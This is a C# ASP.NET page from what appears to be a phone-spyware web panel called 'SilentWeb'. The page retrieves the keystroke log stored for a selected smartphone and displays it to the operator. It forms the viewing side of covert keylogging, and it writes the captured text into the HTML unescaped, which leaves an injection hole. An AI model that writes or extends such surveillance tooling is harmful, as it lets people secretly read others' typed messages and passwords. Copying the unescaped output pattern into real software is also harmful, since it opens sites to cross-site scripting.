using DataLayer;
using System;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Web;

namespace SilentWeb.ToolPages
{
    public partial class Keylogger : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            HttpCookie cookie = Request.Cookies["Logged"];
            Response.Write("<img id='loadingImage' width='100' height='100' style='position:absolute;margin-top:-100px;margin-left:-100px;top:50% !important;left:50% !important;' src='../Pictures/loading.gif'/>");
            Response.Write("<div id='content' class='container text-center' style='display:none'>");

            if (cookie["select"] == null)
            {
                Response.Write("<div class='alert alert-warning'><strong>Warning!</strong>You haven't selected any smartphone.</div>");
            }
            else
            {
                string connectionString = ConfigurationManager.ConnectionStrings["SilentConnection"].ConnectionString;
                DataTable table = SqlHelper.GetSpecificInformation(connectionString, cookie["select"], "GetKeystrokes");

                if (table.Rows.Count == 0)
                {
                    Response.Write("<div class='alert alert-info'><strong>Info!</strong>You don't have any keystrokes saved.</div>");
                }
                else
                {
                    DataRow row = table.Rows[0];
                    Response.Write("<div class='jumbotron'>");
                    Response.Write("<pre>" + row["Info"] + "</pre>");
                    Response.Write("</div>");
                }
            }
            Response.Write("</div>");
        }
    }
}